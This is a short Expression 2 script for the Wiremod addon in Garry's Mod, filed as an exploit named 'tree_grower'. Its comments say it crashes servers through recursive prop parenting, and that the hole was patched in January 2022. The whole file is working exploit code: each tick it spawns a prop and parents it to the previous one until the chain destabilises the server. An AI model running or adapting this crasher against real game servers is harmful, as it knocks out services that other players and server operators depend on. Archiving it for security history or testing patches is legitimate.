@name exploits/tree_grower
@persist N Prev:entity AMT

# Patched on Jan 4 2022 by commit e57aeed
# https://github.com/wiremod/wire/commit/e57aeed

# by Fasteroid
# powered by recursive prop parenting
# server crashing is extremely likely
# can even trigger access violations

if( first() ){
    
    AMT = 256
    
    function entity spawnNext(){
        local NextPos = entity():toWorld(vec(sin(N*20)*10,cos(N*20)*10,N))
        return propSpawn("models/props_junk/PopCan01a.mdl",NextPos,0) 
    }
    
    Prev = entity()
    runOnTick(1)
    
}

if( propCanCreate() & N<AMT ){
    N++
    Next = spawnNext()
    Next:parentTo(Prev)
    Prev = Next    
}
